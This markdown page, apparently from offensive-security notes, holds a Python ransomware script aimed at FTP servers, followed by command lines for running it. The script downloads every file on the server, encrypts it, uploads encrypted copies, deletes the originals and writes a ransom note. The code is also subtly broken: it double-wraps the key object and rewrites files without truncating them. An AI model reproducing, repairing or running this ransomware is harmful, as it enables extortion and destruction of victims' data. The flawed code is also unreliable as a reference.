---
author(s):
  - Userware
tags:
---
# FTP

```python
#!/usr/bin/env python

import base64
from cryptography.fernet import Fernet
from ftplib import FTP
import os
import argparse

def encrypt_files(ftp_connection, file_list, encryption_key):
    for file_name in file_list:
        local_file_path = os.path.join('', file_name)
        with open(local_file_path, "wb+") as file:
            ftp_connection.retrbinary(f"RETR {file_name}", file.write)
            file.seek(0)
            file_content = file.read()
            encrypted_content = Fernet(encryption_key).encrypt(file_content)
            file.seek(0)
            file.write(encrypted_content)
        with open(local_file_path, "rb") as file:
            ftp_connection.storbinary(f"STOR {file_name}.enc", file)
        ftp_connection.delete(file_name)
    ftp_connection.quit()

def decrypt_files(ftp_connection, file_list, decryption_key):
    for file_name in file_list:
        local_file_path = os.path.join('', file_name)
        with open(local_file_path, "wb+") as file:
            ftp_connection.retrbinary(f"RETR {file_name}", file.write)
            file.seek(0)
            encrypted_content = file.read()
            decrypted_content = Fernet(decryption_key).decrypt(encrypted_content)
            file.seek(0)
            file.write(decrypted_content)
        with open(local_file_path, "rb") as file:
            ftp_connection.storbinary(f"STOR {file_name[:-4]}", file)
        ftp_connection.delete(file_name)
    ftp_connection.quit()

def main():
    parser = argparse.ArgumentParser(description="FTP Server Ransomware Configuration")
    parser.add_argument("action", choices=["encrypt", "decrypt"], help="Action to perform: encrypt or decrypt")
    parser.add_argument("-i", "--ip", required=True, help="FTP server IP address")
    parser.add_argument("-p", "--port", type=int, default=21, help="FTP server port (default is 21)")
    parser.add_argument("-u", "--username", required=True, help="FTP server username")
    parser.add_argument("-pw", "--password", required=True, help="FTP server password")
    parser.add_argument("-k", "--key", required=True, help="Encryption/Decryption key file")
    parser.add_argument("-n", "--note", type=str, required=False, help="Path to the custom ransom note file")

    args = parser.parse_args()

    ftp_connection = FTP()
    ftp_connection.connect(args.ip, args.port)
    ftp_connection.login(args.username, args.password)

    file_list = ftp_connection.nlst()
    print(file_list)

    with open(args.key, "rb") as key_file:
        key = key_file.read()

    if args.action == "encrypt":
        if not args.note:
            parser.error("The --note argument is required for encryption.")
        encryption_key = Fernet.generate_key()
        with open(args.key, "wb") as key_file:
            key_file.write(encryption_key)
        print(f"Generated key: {encryption_key.decode()}")
        encrypt_files(ftp_connection, file_list, Fernet(encryption_key))
        with open(args.note, "r") as note_file:
            ransom_note_content = note_file.read()
        with open("ransom_note.txt", "w") as note:
            note.write(ransom_note_content)
    elif args.action == "decrypt":
        decrypt_files(ftp_connection, file_list, Fernet(key))

if __name__ == "__main__":
    main()
```

Encrypt the FTP file server.

```
$ ./ransomware.py encrypt -i <IP> -p <PORT> -u <username> -pw <password> -k crypto_key.key -n ransom_note.txt
```

Decrypt the files from an FTP server with a generated key.

```
$ ./ransomware.py decrypt -i <IP> -p <PORT> -u <username> -pw <password> -k crypto_key.key
```